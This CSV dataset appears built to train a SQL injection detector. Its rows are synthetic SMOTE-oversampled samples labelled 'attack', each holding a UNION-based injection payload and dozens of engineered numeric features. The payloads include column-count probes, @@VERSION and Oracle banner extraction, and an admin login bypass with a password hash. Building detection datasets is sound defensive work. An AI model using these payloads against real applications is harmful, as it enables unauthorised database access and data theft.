id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000467,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,2.535159125835665,65.16465661950187,27.00847757425073,4.288747730541082,29.295402942000834,18.582328309750935,11.286925367750104,6.0,0.449632146964423,0.28211649416090306,0.17487271351506103,0.09337864535961299,1.8607761032503125,0.0,0.7130746322498958,0.0,0.0,0.2869253677501041,3.469446951953614e-18,0.7130746322498959,0.0,3.469446951953614e-18,1.7130746322498958,1.0,1.0,0.0,0.0,0.713074632249896,0.0,0.2869253677501041,0.713074632249896,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.28692536775010413,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.286925367750104
SMOTE_000468,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,1.1803726156130112,66.91163598919057,24.772091002702357,4.218322896539443,27.0,20.911635989190575,11.0,8.0,0.4037631662969382,0.312107198160772,0.16449610478764148,0.11963353075464836,1.0,0.0,2.5441820054047124,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.227908997297644,2.5441820054047124,1.0,0.0,0.7720910027023561,0.22790899729764397,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000469,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,0.019983675717422402,65.13956406304024,24.0,4.0530934924798885,27.0,20.111651250432192,11.0,7.027912812608047,0.4145564330325085,0.3086738571466566,0.1688933616058368,0.10787634821499811,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.027912812608048,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000470,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,0.13962407391045187,74.36761484640023,25.747045938560092,4.2117584918902375,27.0,27.494091877120187,11.0,8.873522969280046,0.3632522665042274,0.36947879525424904,0.1479916641313519,0.1192772741101717,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.873522969280047,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000471,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,1.3278003142171315,63.07187169925017,19.511978616541697,3.5911196267960332,14.0,34.04791446616678,4.0,11.02395723308339,0.22247318086123677,0.5395391347459599,0.06356376596035337,0.17442391843244992,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.5119786165416951,3.469446951953614e-18,6.511978616541695,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000472,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000072,2.30458369678283,95.89989895985948,23.858799755261057,3.6816575231755566,19.1116993269679,44.0,17.717599510522113,15.070600122369473,0.19580421594536176,0.46238143352447864,0.18252707483635422,0.15928727569380538,0.0,1.0,3.0,0.0,0.0,0.464699938815264,3.469446951953614e-18,2.0,0.5353000611847359,3.469446951953614e-18,8.070600122369472,3.464699938815264,0.0,1.0,1.0,0.0,0.0,0.46469993881526406,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.46469993881526406,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.464699938815264
SMOTE_000473,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000024,0.4380219578806367,74.87683588327697,19.112316411672303,3.388850629846896,14.0,43.101468706621574,4.0,13.775367176655394,0.18734535439276762,0.5751855747286789,0.05352724411221932,0.1839418267663342,0.11231641167230322,0.887683588327697,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,8.775367176655394,3.0,0.11231641167230311,0.8876835883276969,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000474,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,2.495725543162368,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,2.683153473972858,1.3168465260271418,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.6707883684932145,0.32921163150678545,0.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000475,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,0.24434310224467945,66.70646865005321,24.0,4.057426375604109,27.0,21.365174920042563,11.0,7.341293730010641,0.4052583179007832,0.31969384545092366,0.16510524062624501,0.10994259602204819,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.341293730010641,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000476,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.1583272790536581,103.22141925307082,27.0,4.101761387932238,29.0,44.97713540245665,15.0,14.244283850614163,0.2810682464413548,0.43558048047603654,0.14538012746966628,0.13797114561294238,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.244283850614163,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000477,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,4.110175726815456,39.48148684984615,19.644880805864254,3.944499534425476,21.738569670371035,5.420476776542987,8.0,4.322440402932127,0.5192448401930618,0.15942578754538198,0.2100046742798332,0.11132469798172301,0.0,0.0,2.03267879120362,0.0,0.3224404029321266,0.0,3.469446951953614e-18,1.0,0.0,0.3224404029321265,0.3224404029321266,2.3551191941357468,0.0,0.0,0.6775595970678734,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,0.32244040293212656,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3224404029321267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6448808058642532
SMOTE_000478,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,0.6811425846990358,54.06358746060349,20.218827675757392,3.934279841952913,14.0,26.62593210908871,4.0,9.437655351514785,0.26157157633530953,0.488807372099258,0.07473473609580272,0.17488631546962974,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.7811723242426076,3.469446951953614e-18,4.656483027272177,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000479,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,1.8150333631261886,75.40356293207883,32.80712586415765,4.440743369416416,40.80712586415765,3.0,17.0,14.596437067921176,0.5411213899173106,0.03978759845680063,0.22546305792187016,0.19362795370401856,3.0,0.0,2.0,0.0,1.5964370679211752,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.1928741358423505,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.4035629320788245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.403562932078825
SMOTE_000480,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.6489510022494682,89.11755053131982,27.51175505313198,4.153846436008266,29.0,32.09404042505585,15.0,13.023510106263963,0.3264426335602489,0.35873961256683595,0.1688496380484046,0.14596811582451052,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.023510106263963,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000481,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.9834070944945735,103.0,26.284675232168205,4.086514575437734,64.86129907132718,4.284675232168201,24.0,9.854025696504612,0.62972135020706,0.0415987886618272,0.23300970873786409,0.09567015239324866,0.8540256965046129,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,7.0,0.28467523216820423,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000482,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000048,3.4063415675710557e-05,36.00024088482062,21.0,4.086046720409004,14.0,12.000192707856497,4.0,6.000048176964125,0.3888873531933112,0.3333351761680266,0.11111067234094603,0.1666667982977162,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.0000481769641243,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000483,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.389022002525467,78.83740699229654,23.432518601540693,3.9864556633482553,27.0,30.269925593837225,11.0,10.567481398459307,0.34348635214884254,0.3827276907228875,0.1399388842087877,0.13384707291948217,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.567481398459306,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000484,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,1.0408160665984711,106.63850970595401,29.0,4.0859715110578305,37.0,38.11080776476321,17.0,14.527701941190802,0.3507148208601908,0.3526016339297026,0.1611392420168444,0.13554430319326224,3.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.527701941190802,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000485,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,1.082367931637459,63.61311084316145,19.602185140526906,3.589818949017822,14.0,34.40874056210763,4.0,11.204370281053816,0.22055970914033832,0.5406325471579019,0.06301705975438236,0.1757906839473774,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.6021851405269082,3.469446951953614e-18,6.602185140526908,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000486,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,2.341375731614122,75.0,32.0,4.406265744738447,41.8707924278523,3.0,17.0,13.1292075721477,0.558277232371364,0.03999999999999998,0.22666666666666666,0.17505610096196933,1.5969056791107752,0.0,2.0,0.0,1.5323018930369252,1.0,3.469446951953614e-18,0.0,0.467698106963075,3.469446951953614e-18,1.0,6.532301893036925,0.5323018930369251,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000487,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,0.37047329473404383,102.82842101171804,26.914210505859018,4.113503123024056,62.0,5.0,24.085789494140982,11.74263151757705,0.6029643273357187,0.04862615543029991,0.23425494699752847,0.11415457023645292,2.742631517577051,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,7.0,0.9142105058590169,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.9142105058590168,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000488,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,2.0113594828951036,76.30964385197132,20.93724035017921,3.588404294920058,14.0,39.74896140071684,8.68620175089605,13.87448070035842,0.1872701422300967,0.5241536284050179,0.10675804754670352,0.18181818181818182,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.9372403501792101,1.0,3.469446951953614e-18,7.93724035017921,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.468620175089605,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000489,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,1.3257942925402026,103.0,26.616211027814334,4.102680305804218,63.535155888742665,4.61621102781433,24.0,10.848633083442998,0.6168461736771134,0.044817582794313915,0.23300970873786409,0.10532653479070872,1.8486330834429974,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,7.0,0.6162110278143325,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000490,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.513495980327019,86.24817171766989,29.49975622902265,4.302729796090737,34.999024916090605,22.999512458045302,16.49975622902265,11.749878114511326,0.40499702057694353,0.26666666666666666,0.19166802094987415,0.13666829180651566,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.749878114511326,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.7498781145113261,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.749878114511326
SMOTE_000491,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.2037403254346462,77.38365583468106,23.0,3.980880554318105,27.0,29.106924667744856,11.0,10.276731166936214,0.3491944919531532,0.3757933579235768,0.14226442264758093,0.132747727475689,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.276731166936214,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000492,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.6389669821672854,98.70381275313464,25.85456706400213,4.077351134905936,63.31421779885045,3.755837981713679,23.145432935997867,8.488324036572646,0.6396860880752757,0.03768368929702698,0.23424086972503938,0.0883893529026579,0.0,0.0,2.0,0.0,2.0,1.8779189908568386,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.122081009143162,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.8779189908568383,1.8779189908568386,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.755837981713677
SMOTE_000493,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,3.623966715900473,85.23099462055937,24.069101382109313,3.968507700599643,52.98913978317678,3.3909178184244233,21.138202764218626,7.712734254739541,0.6267291415891421,0.033573443746776455,0.24832132781266117,0.09137608685142026,0.0,0.0,1.3563671273697706,0.0,1.0,1.6781835636848852,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,0.6781835636848847,5.390917818424426,0.0,0.0,0.6781835636848852,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.6781835636848852,1.0,1.6781835636848852,1.6781835636848852,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.32181643631511486,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.35636712736977
SMOTE_000494,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000025,0.45450149974319926,98.93066690750034,27.821777817916722,3.6961856907204824,25.0,39.28711127166689,22.0,12.643555635833446,0.25284397099069056,0.3969664309432634,0.22250269447180773,0.12768690359423832,0.8217778179167224,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,5.821777817916723,4.0,0.8217778179167224,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000495,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,5.229382754998796,81.42315742754249,29.06586506210644,4.2871272794398685,30.10977510351073,26.46706746894678,16.89022489648927,7.956089958595708,0.3731149243001282,0.3248646043573585,0.2051824514020593,0.09683801994045405,0.0,2.53293253105322,1.4670674689467806,0.0,0.0,1.0,3.469446951953614e-18,0.9780449792978534,0.0,3.469446951953614e-18,1.9780449792978538,2.4670674689467806,0.0,1.0,0.48902248964892686,0.0,0.0,1.0,0.4890224896489268,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.48902248964892686,5.551115123125783e-17,0.5109775103510732,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000496,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,1.697989221091382,75.0,32.0,4.410986473587853,41.3567174778918,3.0,17.0,13.6432825221082,0.551422899705224,0.03999999999999998,0.22666666666666666,0.18191043362810932,1.9824618915811498,0.0,2.0,0.0,1.6608206305270499,1.0,3.469446951953614e-18,0.0,0.33917936947295,3.469446951953614e-18,1.0,6.66082063052705,0.66082063052705,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
